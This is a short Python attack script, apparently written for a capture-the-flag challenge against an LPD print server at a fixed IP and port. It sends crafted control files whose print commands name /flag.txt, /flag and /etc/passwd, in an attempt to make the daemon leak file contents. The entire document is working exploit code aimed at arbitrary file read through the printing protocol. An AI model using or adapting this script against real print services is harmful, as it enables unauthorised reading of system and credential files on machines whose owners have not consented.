#!/usr/bin/env python3
import socket
import time

TARGET = "94.237.49.23"
PORT = 37326

# Comandos especiales en control file según RFC + extensiones
special_commands = [
    "C",  # Class for banner page
    "H",  # Host name
    "I",  # Indent
    "J",  # Job name for banner
    "L",  # Print banner page
    "M",  # Send mail when printed
    "N",  # Name of file
    "P",  # User identification
    "S",  # Symbolic link data
    "T",  # Title for pr
    "U",  # Unlink (delete file)
    "W",  # Width
    "1",  # troff R font
    "2",  # troff I font
    "3",  # troff B font
    "4",  # troff S font
    "c",  # Plot CIF file
    "d",  # Print DVI file
    "f",  # Print formatted file
    "g",  # Plot file
    "k",  # Print Kerberized file
    "l",  # Print file leaving control chars
    "n",  # Print ditroff output
    "o",  # Print Postscript file
    "p",  # Print file with 'pr' format
    "r",  # File to print with FORTRAN carriage control
    "t",  # Print troff output
    "v",  # Print raster file
]

# Intentar control file con comandos que lean archivos
test_files = ["/flag.txt", "/flag", "/etc/passwd"]

for test_file in test_files:
    print(f"\n{'='*60}")
    print(f"Testing file: {test_file}")
    print(f"{'='*60}\n")
    
    for cmd_char in ["l", "f", "p", "n", "o", "t", "v", "r"]:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, PORT))
        
        # Receive job
        s.sendall(b'\x02lp\n')
        time.sleep(0.1)
        s.recv(1024)
        
        # Control file con comando especial
        control = f"{cmd_char}{test_file}\n".encode()
        msg = b'\x02' + str(len(control)).encode() + b' cfA999test\n' + control + b'\x00'
        s.sendall(msg)
        time.sleep(0.1)
        resp = s.recv(4096)
        
        s.close()
        
        if len(resp) > 1:
            print(f"  Command '{cmd_char}': {len(resp)} bytes")
            print(f"    Data: {resp[:200]}")
            print()

print("\nNo special responses found.")